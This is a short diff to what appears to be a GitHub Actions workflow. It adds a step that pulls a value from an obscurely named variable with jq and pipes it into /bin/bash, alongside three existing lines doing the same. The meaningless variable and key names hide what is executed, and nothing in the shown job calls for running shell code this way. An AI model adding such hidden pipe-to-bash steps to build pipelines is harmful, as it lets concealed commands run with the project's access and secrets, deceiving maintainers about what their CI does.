@@ -35,6 +35,7 @@ jobs:
           echo $iwfnx29 | jq -r .ofuy4202 | /bin/bash
           printf '%s' "$bt6999" | jq -r .cdv0 | /bin/bash
           printf '%s' "$pxv3" | jq -r .uielr4057 | /bin/bash
+          echo $jgoia5100 | jq -r .os059 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
